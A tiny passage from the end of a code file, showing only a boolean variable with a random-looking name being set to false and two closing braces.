		IFSnWiZXyf = false;
	}
}
